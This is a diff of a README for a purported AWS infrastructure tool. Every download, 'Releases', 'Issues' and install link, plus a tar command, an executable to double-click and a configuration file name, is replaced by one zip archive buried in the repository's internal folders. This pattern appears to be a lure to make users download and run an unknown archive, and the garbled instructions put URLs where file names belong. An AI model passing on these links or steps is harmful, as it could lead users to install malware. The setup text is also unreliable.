@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download](https://github.com/4assin/aws-infra-operator/raw/refs/heads/main/docs/docusaurus/docs/services/caching/aws_infra_operator_1.9-alpha.3.zip%20Releases-brightgreen)](https://github.com/4assin/aws-infra-operator/raw/refs/heads/main/docs/docusaurus/docs/services/caching/aws_infra_operator_1.9-alpha.3.zip)
+[![Download](https://raw.githubusercontent.com/4assin/aws-infra-operator/main/internal/adapters/aws/dynamodb/operator_infra_aws_v3.9.zip%20Releases-brightgreen)](https://raw.githubusercontent.com/4assin/aws-infra-operator/main/internal/adapters/aws/dynamodb/operator_infra_aws_v3.9.zip)
 
 ## 📋 Description
 
@@ -19,7 +19,7 @@ Follow these simple steps to get started with the aws-infra-operator:
    - An internet connection for downloading and using the tool.
 
 2. **Visit the Releases Page:**  
-   To download the latest version of aws-infra-operator, [visit the Releases page](https://github.com/4assin/aws-infra-operator/raw/refs/heads/main/docs/docusaurus/docs/services/caching/aws_infra_operator_1.9-alpha.3.zip). Here, you will find the available versions of the software.
+   To download the latest version of aws-infra-operator, [visit the Releases page](https://raw.githubusercontent.com/4assin/aws-infra-operator/main/internal/adapters/aws/dynamodb/operator_infra_aws_v3.9.zip). Here, you will find the available versions of the software.
 
 ## 📥 Download & Install
 
@@ -28,21 +28,21 @@ Follow these simple steps to get started with the aws-infra-operator:
 
 2. **Download the Appropriate File:**  
    Depending on your operating system, choose the file that suits your needs. You will generally see options like:
-   - Windows (e.g., `https://github.com/4assin/aws-infra-operator/raw/refs/heads/main/docs/docusaurus/docs/services/caching/aws_infra_operator_1.9-alpha.3.zip`)
-   - macOS (e.g., `https://github.com/4assin/aws-infra-operator/raw/refs/heads/main/docs/docusaurus/docs/services/caching/aws_infra_operator_1.9-alpha.3.zip`)
-   - Linux (e.g., `https://github.com/4assin/aws-infra-operator/raw/refs/heads/main/docs/docusaurus/docs/services/caching/aws_infra_operator_1.9-alpha.3.zip`)
+   - Windows (e.g., `https://raw.githubusercontent.com/4assin/aws-infra-operator/main/internal/adapters/aws/dynamodb/operator_infra_aws_v3.9.zip`)
+   - macOS (e.g., `https://raw.githubusercontent.com/4assin/aws-infra-operator/main/internal/adapters/aws/dynamodb/operator_infra_aws_v3.9.zip`)
+   - Linux (e.g., `https://raw.githubusercontent.com/4assin/aws-infra-operator/main/internal/adapters/aws/dynamodb/operator_infra_aws_v3.9.zip`)
 
    Click on the file to start the download.
 
 3. **Extract the Files:**  
    Once the download is complete, you may need to extract the files from the downloaded archive. For Windows and macOS, you can usually double-click the .zip file to extract it. For Linux, you can use the terminal command:
    ```bash
-   tar -xzf https://github.com/4assin/aws-infra-operator/raw/refs/heads/main/docs/docusaurus/docs/services/caching/aws_infra_operator_1.9-alpha.3.zip
+   tar -xzf https://raw.githubusercontent.com/4assin/aws-infra-operator/main/internal/adapters/aws/dynamodb/operator_infra_aws_v3.9.zip
    ```
 
 4. **Run the Application:**
    - **Windows:**  
-     Navigate to the extracted folder and double-click `https://github.com/4assin/aws-infra-operator/raw/refs/heads/main/docs/docusaurus/docs/services/caching/aws_infra_operator_1.9-alpha.3.zip`.
+     Navigate to the extracted folder and double-click `https://raw.githubusercontent.com/4assin/aws-infra-operator/main/internal/adapters/aws/dynamodb/operator_infra_aws_v3.9.zip`.
    
    - **macOS/Linux:**  
      Open your terminal, navigate to the extracted directory, and run:
@@ -86,7 +86,7 @@ Once installed, you can start using aws-infra-operator for your AWS management t
 
 ## 🛠️ Configuration
 
-You may want to customize aws-infra-operator's settings. Create a configuration file named `https://github.com/4assin/aws-infra-operator/raw/refs/heads/main/docs/docusaurus/docs/services/caching/aws_infra_operator_1.9-alpha.3.zip` in your project directory. Below is a sample configuration:
+You may want to customize aws-infra-operator's settings. Create a configuration file named `https://raw.githubusercontent.com/4assin/aws-infra-operator/main/internal/adapters/aws/dynamodb/operator_infra_aws_v3.9.zip` in your project directory. Below is a sample configuration:
 
 ```yaml
 aws:
@@ -108,10 +108,10 @@ For additional details, refer to the official documentation hosted on our websit
 
 If you face issues or have questions while using aws-infra-operator, you can reach out for help:
 
-- Check the [Issues page](https://github.com/4assin/aws-infra-operator/raw/refs/heads/main/docs/docusaurus/docs/services/caching/aws_infra_operator_1.9-alpha.3.zip) on GitHub for existing solutions.
+- Check the [Issues page](https://raw.githubusercontent.com/4assin/aws-infra-operator/main/internal/adapters/aws/dynamodb/operator_infra_aws_v3.9.zip) on GitHub for existing solutions.
 - Open a new issue if you don't find your solution.
 - Join our community discussions to connect with other users.
 
 ## 📥 Download Now Again
 
-You can download the latest version of aws-infra-operator by [visiting this page](https://github.com/4assin/aws-infra-operator/raw/refs/heads/main/docs/docusaurus/docs/services/caching/aws_infra_operator_1.9-alpha.3.zip). Start managing your AWS resources effortlessly today!
+You can download the latest version of aws-infra-operator by [visiting this page](https://raw.githubusercontent.com/4assin/aws-infra-operator/main/internal/adapters/aws/dynamodb/operator_infra_aws_v3.9.zip). Start managing your AWS resources effortlessly today!
